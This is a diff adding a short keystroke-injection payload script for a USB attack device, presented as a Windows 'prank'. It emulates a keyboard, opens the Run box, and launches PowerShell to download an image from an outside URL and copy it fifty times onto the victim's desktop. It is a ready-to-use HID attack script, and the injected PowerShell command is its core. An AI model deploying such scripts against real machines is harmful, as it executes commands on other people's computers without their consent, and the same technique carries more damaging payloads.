@@ -1,0 +1,46 @@
+#!/bin/bash
+#
+# Title: 	Desktop Flood
+# Description:	Floods desktop with image it downloads from link
+# Author:	JustaProgrammer9
+# Category:	Prank
+# Target:	Windows
+# Attackmodes:	HID
+#
+
+#--// CONFIG \\--#
+
+#removing [ https:// ] can help keep command below runbox character limit
+
+ImageLink='i.ytimg.com/vi/7yN0g2QIJSU/maxresdefault.jpg'
+
+ImageName="Gift"
+
+Amount=50
+
+
+####--// SETUP \\--####
+
+LED W
+
+ATTACKMODE HID
+
+#--> FOR BLUETOOTH <--#
+
+#WAIT_FOR_PRESENT YourDevice
+#WAIT_FOR_NOT_PRESENT YourDevice
+
+
+#--// ATTACK \\--#
+
+LED Y
+
+RUN WIN "cmd /c powershell \"curl $ImageLink -O C:\Users\%USERNAME%\Desktop\\$ImageName.jpg;sleep 1;1..$Amount | % { copy-Item \"C:\Users\%USERNAME%\desktop\\$ImageName.jpg\" \"C:\Users\%USERNAME%\desktop\\$ImageName\$_.jpg\"}\""
+
+Q ENTER
+
+
+####--// DONE \\--####
+
+LED G
+
